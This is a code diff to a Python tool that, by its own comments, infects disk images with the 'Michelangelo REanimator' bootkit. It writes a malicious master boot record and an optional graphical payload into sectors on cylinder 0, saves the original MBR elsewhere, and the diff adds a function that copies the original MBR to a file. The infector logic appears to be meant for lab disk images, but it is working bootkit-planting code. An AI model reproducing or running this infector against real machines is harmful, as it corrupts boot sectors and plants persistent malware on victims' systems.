@@ -17,6 +17,15 @@ import argparse
 # 	Michelangelo REanimator bootkit
 #####################################################################
 
+def steal_mbr(disk_img, stolen_mbr):
+	with open(disk_img, "r+b") as disk_img_file:
+		disk_img_file.seek(0)
+		og_mbr=disk_img_file.read(2048)
+		with open(stolen_mbr, "w+b") as stolenmbr:
+			stolenmbr.write(og_mbr)
+	return 0
+
+
 def vxinfect(mal_mbr, disk_img, sector_number):
 	with open(mal_mbr, 'rb') as mbr_file:
 		mbr=mbr_file.read()
@@ -28,7 +37,8 @@ def vxinfect(mal_mbr, disk_img, sector_number):
 	return 0
 
 ##hardcoding these vals for now
-mbr_crypt_len=0x9c
+#mbr_crypt_len=0x9c
+mbr_crypt_len=0x56
 crypt_offset=0x24
 testkey=0x12
 #def mbr_encrypt(mbr, crypt_offset, mbr_crypt_len):
@@ -85,6 +95,8 @@ def setup_options():
 	parser.add_argument('-ogmbrsector', type=int, help='starting sector on cylinder 0, head 0 of disk to write saved copy of original MBR to')
 	parser.add_argument('-vxpaintsector', type=int, nargs='?', help='starting sector of vxpaint graphical payload, on cylinder 0, head 0 of disk to write payload to')
 	parser.add_argument('-vxpaintnum', type=int, nargs='?', required=False, help='Number of sectors reserved for vxpaint graphical payload, cylinder 0, head 0 of disk to write payload to')
+	parser.add_argument('-stealmbr', type=str, nargs='?', required=False, default='stolen_og_mbr.mbr', help='Copy original MBR from disk_img and write it to file specified by stealmbr; default is stolen_og_mbr.mbr')
+	
 	args = parser.parse_args()
 	return parser, args
 
@@ -98,11 +110,17 @@ if __name__ == '__main__':
 	vx_paint=args.vxpaint
 	vx_paintsector=args.vxpaintsector
 	vx_paintnum=args.vxpaintnum
+	stolen_mbr=args.stealmbr
+
+	if stolen_mbr != None:
+		steal_mbr(disk_img, stolen_mbr)
 	
 	if vx_paint == None:
-		infect(mal_mbr, disk_img, sector)
+		if mal_mbr != None:
+			infect(mal_mbr, disk_img, sector)
 
 	else:
-		#vxinfect_this_time_with_feeling(mal_mbr, disk_img, sector, vx_paint, vx_paintsector)
-		vxinfect_this_time_with_feeling(mal_mbr, disk_img, sector, og_mbr, og_mbr_sector, vx_paint, vx_paintsector)
-		
+		if mal_mbr != None:
+			vxinfect_this_time_with_feeling(mal_mbr, disk_img, sector, og_mbr, og_mbr_sector, vx_paint, vx_paintsector)
+		else:
+			print("You need to provide me with a malicious MBR if you want me to infect a disk image, honey.")
